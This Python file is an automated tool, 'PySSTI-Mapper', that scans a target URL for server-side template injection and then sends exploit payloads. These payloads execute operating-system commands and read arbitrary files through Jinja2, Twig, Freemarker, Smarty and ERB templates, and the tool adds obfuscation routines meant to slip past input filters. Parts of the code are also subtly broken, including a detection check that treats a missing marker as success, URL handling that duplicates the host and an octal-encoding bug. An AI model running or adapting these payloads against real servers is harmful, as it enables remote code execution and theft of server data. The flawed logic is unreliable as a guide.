#!/usr/bin/env python3
import re
import time
import requests
import argparse
import random
import string
import urllib.parse
from http.client import HTTPConnection

class PySSTIMapper:
    def __init__(self, target_url, method="GET", params=None, data=None, headers=None, rate_limit=3, verbose=False):
        self.target = self.normalize_url(target_url)
        self.method = method.upper()
        self.params = params or {}
        self.data = data or {}
        self.headers = headers or {}
        self.rate_limit = rate_limit
        self.verbose = verbose
        self.engine = None
        self.context = None
        self.vulnerable_param = None
        self.safeword = f"SAFE_{''.join(random.choices(string.ascii_uppercase, k=6))}"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "PySSTI-Mapper/1.0"})
        if self.headers:
            self.session.headers.update(self.headers)
        
        if self.verbose:
            print(f"[*] Target URL: {self.target}")
            print(f"[*] Headers: {self.headers}")

    def normalize_url(self, url):
        """Ensure URL has proper scheme and port handling"""
        parsed = urllib.parse.urlparse(url)
        if not parsed.scheme:
            url = "http://" + url
            parsed = urllib.parse.urlparse(url)
        
        # Add default port if missing
        if not parsed.port:
            if parsed.scheme == "https":
                url = url.replace("https://", "https://" + parsed.netloc + ":443")
            else:
                url = url.replace("http://", "http://" + parsed.netloc + ":80")
        return url

    def _send_request(self, payload, param):
        """Send payload with rate limiting and proper URL handling"""
        time.sleep(1 / self.rate_limit)
        
        # Clone parameters to avoid mutation
        test_params = self.params.copy()
        test_data = self.data.copy()
        
        # Apply payload to the current parameter
        if self.method == "GET":
            test_params[param] = payload
        elif self.method == "POST":
            test_data[param] = payload

        try:
            if self.verbose:
                print(f"\n[>] Testing param: {param}")
                print(f"[>] Payload: {payload}")
                print(f"[>] Method: {self.method}")
                if test_params:
                    print(f"[>] Params: {test_params}")
                if test_data:
                    print(f"[>] Data: {test_data}")

            if self.method == "GET":
                r = self.session.get(self.target, params=test_params)
            elif self.method == "POST":
                r = self.session.post(self.target, data=test_data)
            else:
                raise ValueError("Unsupported HTTP method")
                
            if self.verbose:
                print(f"[<] Response status: {r.status_code}")
                print(f"[<] Response size: {len(r.text)} bytes")
                print(f"[<] Response snippet:\n{r.text[:300]}{'...' if len(r.text) > 300 else ''}")
                
            return r.text
        except Exception as e:
            print(f"[!] Request failed: {e}")
            return None

    def _detect_engine(self, response):
        """Identify template engine from response patterns"""
        patterns = {
            "Jinja2": r"jinja2\.|TemplateSyntaxError|UndefinedError",
            "Twig": r"Twig\b|TemplateNotFoundException",
            "Freemarker": r"FreeMarker\b|FTL stack trace",
            "Velocity": r"Apache Velocity|ParseException",
            "Smarty": r"Smarty",
            "ERB": r"ERB"
        }
        for engine, pattern in patterns.items():
            if re.search(pattern, response, re.IGNORECASE):
                return engine
        return None

    def _is_evaluated(self, payload, response):
        """Check if payload was evaluated by engine"""
        # Check for mathematical evaluation
        if "7*7" in payload and "49" in response:
            return True
        if "7*7" in payload and "343" in response:  # For nested evaluation
            return True
            
        # Check for string manipulation
        if "'a'+'b'" in payload and "ab" in response:
            return True
            
        # Check for safeword absence (should be in comment)
        if self.safeword not in response:
            return True
            
        return False

    def probe_ssti(self):
        """Main detection workflow"""
        # Phase 1: Basic syntax probing
        probes = {
            "Jinja2/Twig": "{{ %s }}",
            "Freemarker": "${%s}",
            "Velocity": "#set($%s)",
            "Smarty": "{%s}",
            "ERB": "<%= %s %>"
        }
        
        # Get all parameters to test
        params_to_test = list(set(list(self.params.keys()) + list(self.data.keys())))
        
        if not params_to_test:
            print("[!] No parameters to test")
            return False
            
        print(f"[*] Testing parameters: {', '.join(params_to_test)}")
        
        for param in params_to_test:
            # Phase 1: Engine detection
            for engine, syntax in probes.items():
                # Create payload with different evaluation tests
                math_payload = syntax % f"7*7 # {self.safeword}"
                str_payload = syntax % f"'a'+'b' # {self.safeword}"
                
                for payload in [math_payload, str_payload]:
                    response = self._send_request(payload, param)
                    if not response:
                        continue
                    
                    if self._is_evaluated(payload, response):
                        detected_engine = self._detect_engine(response) or engine.split('/')[0]
                        self.engine = detected_engine
                        self.vulnerable_param = param
                        print(f"[+] Detected {self.engine} SSTI in parameter: {param}")
                        
                        # Phase 2: Context analysis
                        context_payloads = [
                            syntax % "''.__class__",  # Python context
                            syntax % "request",       # Flask/Django objects
                            syntax % "this",          # Java context
                            syntax % "self"           # General context
                        ]
                        for ctx_payload in context_payloads:
                            ctx_response = self._send_request(ctx_payload, param)
                            if ctx_response:
                                if '__class__' in ctx_response:
                                    self.context = "Python"
                                elif 'javax.servlet' in ctx_response:
                                    self.context = "Java"
                                elif 'Request' in ctx_response or 'request' in ctx_response:
                                    self.context = "WebFramework"
                                elif 'self' in ctx_response:
                                    self.context = "General"
                        return True
        return False

    def generate_exploit_chain(self):
        """Build comprehensive exploit chains with filter bypass capabilities"""
        if not self.engine or not self.vulnerable_param:
            return None

        # Define exploit chains with multiple attack vectors
        exploits = {
            "Jinja2": {
                "detection": "{{7*7}} → 49",
                "context_analysis": [
                    "{{ ''.__class__ }} → Python str",
                    "{{ config.items() }} → Flask config"
                ],
                "exploit_vectors": [
                    {
                        "type": "rce",
                        "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('COMMAND').read() }}",
                        "description": "Direct OS command execution via Python builtins",
                        "severity": "critical"
                    },
                    {
                        "type": "file_read",
                        "payload": "{{ self.__init__.__globals__.__builtins__.open('FILE_PATH').read() }}",
                        "description": "Arbitrary file read",
                        "severity": "high"
                    },
                    {
                        "type": "sandbox_escape",
                        "payload": "{{ ''.__class__.__base__.__subclasses__()[X].init.globals }}",
                        "description": "Access Python subclasses to find exploitable modules",
                        "severity": "high"
                    },
                    {
                        "type": "blind_time",
                        "payload": "{{ self.__init__.__globals__.__builtins__.__import__('time').sleep(TIME) }}",
                        "description": "Time-based blind RCE detection",
                        "severity": "medium"
                    }
                ],
                "cleanup": "echo 'No persistent artifacts'"
            },
            "Twig": {
                "detection": "{{7*7}} → 49",
                "context_analysis": ["{{ _self }} → Twig environment"],
                "exploit_vectors": [
                    {
                        "type": "rce",
                        "payload": "{{ _self.env.enableDebug() }}{{ _self.env.setCache('php://filter/convert.base64-decode/resource=CMD') }}",
                        "description": "Write malicious PHP to cache file",
                        "severity": "critical"
                    },
                    {
                        "type": "file_read",
                        "payload": "{{ file_get_contents('FILE_PATH') }}",
                        "description": "Read arbitrary files",
                        "severity": "high"
                    },
                    {
                        "type": "info_leak",
                        "payload": "{{ app.request.server.all|join(',') }}",
                        "description": "Leak server environment variables",
                        "severity": "medium"
                    }
                ],
                "cleanup": "rm -f /tmp/cmd"
            },
            "Freemarker": {
                "detection": "${7*7} → 49",
                "context_analysis": [
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}"
                ],
                "exploit_vectors": [
                    {
                        "type": "rce",
                        "payload": "<#assign ex=freemarker.template.utility.Execute()>${ex(\"COMMAND\")}",
                        "description": "Direct command execution via Execute utility",
                        "severity": "critical"
                    },
                    {
                        "type": "rce_alt",
                        "payload": "${\"freemarker.template.utility.Execute\"?new()(\"COMMAND\")}",
                        "description": "Alternative command execution syntax",
                        "severity": "critical"
                    },
                    {
                        "type": "file_read",
                        "payload": "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.io.File\",\"FILE_PATH\").toURL().content}",
                        "description": "Read arbitrary files through Java API",
                        "severity": "high"
                    }
                ],
                "cleanup": "No cleanup needed"
            },
            "Smarty": {
                "detection": "{7*7} → 49",
                "context_analysis": ["{$smarty.version} → Smarty version"],
                "exploit_vectors": [
                    {
                        "type": "rce",
                        "payload": "{system(\"COMMAND\")}",
                        "description": "Direct system command execution",
                        "severity": "critical"
                    },
                    {
                        "type": "file_read",
                        "payload": "{fetch file=\"FILE_PATH\"}",
                        "description": "Read arbitrary files",
                        "severity": "high"
                    },
                    {
                        "type": "php_exec",
                        "payload": "{php}echo shell_exec(\"COMMAND\");{/php}",
                        "description": "Execute PHP code (requires {php} tags enabled)",
                        "severity": "critical"
                    }
                ],
                "cleanup": "No cleanup needed"
            },
            "ERB": {
                "detection": "<%= 7*7 %> → 49",
                "context_analysis": ["<%= self %> → Ruby context"],
                "exploit_vectors": [
                    {
                        "type": "rce",
                        "payload": "<%= system(\"COMMAND\") %>",
                        "description": "Direct system command execution",
                        "severity": "critical"
                    },
                    {
                        "type": "rce_alt",
                        "payload": "<%= `COMMAND` %>",
                        "description": "Backtick command execution",
                        "severity": "critical"
                    },
                    {
                        "type": "file_read",
                        "payload": "<%= File.read('FILE_PATH') %>",
                        "description": "Read arbitrary files",
                        "severity": "high"
                    }
                ],
                "cleanup": "No cleanup needed"
            }
        }

        chain = exploits.get(self.engine)
        if not chain:
            return None

        # Define filter bypass techniques
        bypass_techniques = {
            "all": [
                {"name": "String Concatenation", "func": self._concat_strings},
                {"name": "Case Manipulation", "func": self._random_case},
                {"name": "Whitespace Variation", "func": self._vary_whitespace},
                {"name": "Comment Injection", "func": self._inject_comments},
                {"name": "Hex Encoding", "func": self._hex_encode},
                {"name": "Octal Encoding", "func": self._octal_encode},
                {"name": "Unicode Escape", "func": self._unicode_escape},
                {"name": "Nested Expressions", "func": self._nest_expressions}
            ],
            "Jinja2": [
                {"name": "Attribute Alternative", "func": self._jinja_attribute_alt},
                {"name": "Global Lookup", "func": self._jinja_global_lookup}
            ],
            "Twig": [
                {"name": "Filter Chaining", "func": self._twig_filter_chain},
                {"name": "Context Bypass", "func": self._twig_context_bypass}
            ],
            "Freemarker": [
                {"name": "Method Invocation Alt", "func": self._freemarker_method_alt}
            ]
        }

        # Test each exploit vector with bypass techniques
        tested_vectors = []
        for vector in chain["exploit_vectors"]:
            # Create base payload
            base_payload = vector["payload"]
            
            # Apply bypass techniques
            tested_variants = []
            bypass_success = False
            
            # Test original payload first
            test_payload = self._prepare_test_payload(base_payload)
            result = self._test_payload(test_payload, vector)
            tested_variants.append({
                "payload": test_payload,
                "bypass": "None",
                "result": result
            })
            if "VERIFIED" in result["status"]:
                bypass_success = True
            
            # Apply generic bypass techniques
            if not bypass_success:
                for technique in bypass_techniques["all"]:
                    obfuscated = technique["func"](base_payload)
                    test_payload = self._prepare_test_payload(obfuscated)
                    result = self._test_payload(test_payload, vector)
                    tested_variants.append({
                        "payload": test_payload,
                        "bypass": technique["name"],
                        "result": result
                    })
                    if "VERIFIED" in result["status"]:
                        bypass_success = True
                        break
            
            # Apply engine-specific bypass techniques
            if not bypass_success and self.engine in bypass_techniques:
                for technique in bypass_techniques[self.engine]:
                    obfuscated = technique["func"](base_payload)
                    test_payload = self._prepare_test_payload(obfuscated)
                    result = self._test_payload(test_payload, vector)
                    tested_variants.append({
                        "payload": test_payload,
                        "bypass": technique["name"],
                        "result": result
                    })
                    if "VERIFIED" in result["status"]:
                        bypass_success = True
                        break
            
            # Update vector results
            vector_result = vector.copy()
            vector_result["tested_variants"] = tested_variants
            vector_result["bypass_success"] = bypass_success
            tested_vectors.append(vector_result)
        
        chain["exploit_vectors"] = tested_vectors
        chain["rce_feasibility"] = self._assess_rce_feasibility(tested_vectors)
        
        return chain

    def _prepare_test_payload(self, payload):
        """Replace placeholders with test values"""
        payload = payload.replace("COMMAND", f"echo {self.safeword}")
        payload = payload.replace("FILE_PATH", "/etc/hostname")
        payload = payload.replace("TIME", "3")
        return payload

    def _test_payload(self, test_payload, vector):
        """Execute and evaluate payload test"""
        start_time = time.time()
        response = self._send_request(test_payload, self.vulnerable_param)
        elapsed = time.time() - start_time
        
        result = {
            "payload": test_payload,
            "response_snippet": response[:200] + "..." if response else None,
            "elapsed_time": elapsed,
            "status": "PENDING"
        }
        
        if not response:
            result["status"] = "FAILED (No response)"
            return result
        
        if self.safeword in response:
            result["status"] = "VERIFIED (Verbose)"
        elif elapsed > 3 and ("sleep" in test_payload or "TIME" in vector["payload"]):
            result["status"] = "VERIFIED (Time-based)"
        elif response.strip() == "1" and "system" in test_payload:
            result["status"] = "VERIFIED (Exit code)"
        else:
            result["status"] = "POSSIBLE (Requires manual verification)"
        
        return result

    def _assess_rce_feasibility(self, vectors):
        """Determine RCE feasibility based on test results"""
        feasibility = {
            "direct": "none",
            "blind": "none",
            "file_read": "none"
        }
        
        for vector in vectors:
            for variant in vector["tested_variants"]:
                result = variant["result"]
                if "VERIFIED" in result["status"]:
                    if "rce" in vector["type"]:
                        if "Verbose" in result["status"]:
                            feasibility["direct"] = "confirmed"
                        elif "Time-based" in result["status"] or "Exit code" in result["status"]:
                            feasibility["blind"] = "confirmed"
                    elif "file_read" in vector["type"]:
                        feasibility["file_read"] = "confirmed"
    
        if feasibility["direct"] == "confirmed":
            return "DIRECT (Verbose output)"
        elif feasibility["blind"] == "confirmed":
            return "BLIND (Time-based/exit code)"
        elif feasibility["file_read"] == "confirmed":
            return "INDIRECT (File read only)"
        
        return "UNCONFIRMED (Manual verification required)"

    def visualize_context(self):
        """Generate context map based on responses"""
        return f"Context: {self.context} | Direct Object Access: {'Yes' if self.context else 'No'}"

    # Filter Bypass Techniques --------------------------------
    
    def _concat_strings(self, payload):
        """Split strings using concatenation"""
        return re.sub(r"'(.*?)'", lambda m: "'" + "+".join(
            f"'{c}'" if random.random() > 0.3 else f"'{c*2}'[0]"
            for c in m.group(1)) + "'", payload)

    def _random_case(self, payload):
        """Randomize character casing"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

    def _vary_whitespace(self, payload):
        """Add random whitespace variations"""
        tokens = re.split(r'(\s+)', payload)
        return ''.join(
            token + ''.join(random.choice(['\t', '\x0b', '\x0c', '  '])
            for _ in range(random.randint(0, 3)))
            if i % 2 == 0 else token
            for i, token in enumerate(tokens)
        )

    def _inject_comments(self, payload):
        """Inject random comments"""
        return re.sub(r'([{<])(?!\s)', r'\1/*{}*/'.format(
            ''.join(random.choices(string.ascii_letters, k=random.randint(3, 8))), payload)

    def _hex_encode(self, payload):
        """Encode key strings in hex"""
        return re.sub(r'\b(\w+)\b', lambda m: 
            ''.join(f'\\x{c:02x}' for c in m.group(0).encode())
            if random.random() > 0.7 and len(m.group(0)) > 3 else m.group(0), payload)

    def _octal_encode(self, payload):
        """Encode characters in octal"""
        return re.sub(r'(\w)', lambda m: 
            f'\\{oct(ord(m.group(0))[2:]}' 
            if random.random() > 0.8 else m.group(0), payload)

    def _unicode_escape(self, payload):
        """Use unicode escape sequences"""
        return ''.join(
            f'\\u{ord(c):04x}' if random.random() > 0.9 and c not in '{}<>$' else c
            for c in payload
        )

    def _nest_expressions(self, payload):
        """Create nested expressions"""
        if self.engine == "Jinja2":
            return payload.replace("__class__", "__class__.__class__")
        return payload

    # Engine-Specific Bypasses --------------------------------

    def _jinja_attribute_alt(self, payload):
        """Use alternative attribute access"""
        replacements = {
            "__class__": ["|attr('__class__')", ".__class__"],
            "__globals__": ["|attr('__globals__')", "['__globals__']"],
            "__builtins__": ["|attr('__builtins__')", "['__builtins__']"]
        }
        for key, alts in replacements.items():
            if key in payload:
                payload = payload.replace(key, random.choice(alts))
        return payload

    def _jinja_global_lookup(self, payload):
        """Use global namespace lookup"""
        if "config" in payload:
            return payload
        return payload.replace(
            "self.__init__", 
            "lipsum.__globals__.__builtins__"
        )

    def _twig_filter_chain(self, payload):
        """Use Twig filter chaining"""
        return payload.replace(
            "_self.env", 
            "_self|escape|trim|split('')|join('')|slice(0,100)|reduce((v,k)=>v~k, 'env')"
        )

    def _twig_context_bypass(self, payload):
        """Access context through alternative objects"""
        return payload.replace("_self", "context")

    def _freemarker_method_alt(self, payload):
        """Alternative method invocation"""
        if "?new()" in payload:
            return payload.replace("?new()", "?api.new()")
        return payload

def parse_key_value_args(args):
    """Parse key=value arguments into dictionary"""
    result = {}
    if args:
        for item in args:
            if '=' in item:
                key, value = item.split('=', 1)
                result[key] = value
    return result

def parse_header_args(args):
    """Parse header arguments into dictionary"""
    result = {}
    if args:
        for item in args:
            if ':' in item:
                key, value = item.split(':', 1)
                result[key.strip()] = value.strip()
    return result

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PySSTI-Mapper: Automated SSTI Detection & Exploit Framework")
    parser.add_argument("--url", required=True, help="Target URL (include port if not 80/443)")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)")
    parser.add_argument("--params", nargs="*", metavar="KEY=VALUE", help="Request parameters (GET)")
    parser.add_argument("--data", nargs="*", metavar="KEY=VALUE", help="Request data (POST)")
    parser.add_argument("--headers", nargs="*", metavar="HEADER:VALUE", help="HTTP headers")
    parser.add_argument("--rate", type=int, default=3, help="Requests per second (default: 3)")
    parser.add_argument("--verbose", action="store_true", help="Show detailed debugging information")
    
    args = parser.parse_args()
    
    # Parse arguments into dictionaries
    params_dict = parse_key_value_args(args.params)
    data_dict = parse_key_value_args(args.data)
    headers_dict = parse_header_args(args.headers)
    
    mapper = PySSTIMapper(
        target_url=args.url,
        method=args.method,
        params=params_dict,
        data=data_dict,
        headers=headers_dict,
        rate_limit=args.rate,
        verbose=args.verbose
    )
    
    print(f"[*] Scanning {args.url} for SSTI vulnerabilities...")
    print(f"[*] Using safeword: {mapper.safeword}")
    print(f"[*] Rate limit: {args.rate} req/sec")
    
    if mapper.probe_ssti():
        print(f"[!] Confirmed {mapper.engine} vulnerability in parameter: {mapper.vulnerable_param}")
        exploit_chain = mapper.generate_exploit_chain()
        print("\n--- EXPLOIT CHAIN ---")
        
        # Print basic chain info
        print(f"DETECTION: {exploit_chain['detection']}")
        print("CONTEXT ANALYSIS:")
        for item in exploit_chain["context_analysis"]:
            print(f"  - {item}")
        
        # Print exploit vectors with bypass results
        print("\nEXPLOIT VECTORS:")
        for vector in exploit_chain["exploit_vectors"]:
            print(f"\n[{vector['type'].upper()}] {vector['description']}")
            print(f"  Severity: {vector['severity']}")
            print(f"  Bypass Success: {'Yes' if vector['bypass_success'] else 'No'}")
            
            for variant in vector["tested_variants"]:
                status = variant["result"]["status"]
                print(f"  - {status} via {variant['bypass']}")
                if "VERIFIED" in status or args.verbose:
                    print(f"    Payload: {variant['payload']}")
                    if args.verbose and variant["result"]["response_snippet"]:
                        print(f"    Response: {variant['result']['response_snippet']}")
        
        # Print overall feasibility
        print(f"\nRCE FEASIBILITY: {exploit_chain['rce_feasibility']}")
        print(f"CLEANUP: {exploit_chain.get('cleanup', 'No cleanup needed')}")
        print(f"\nCONTEXT: {mapper.visualize_context()}")
    else:
        print("[!] No SSTI detected")
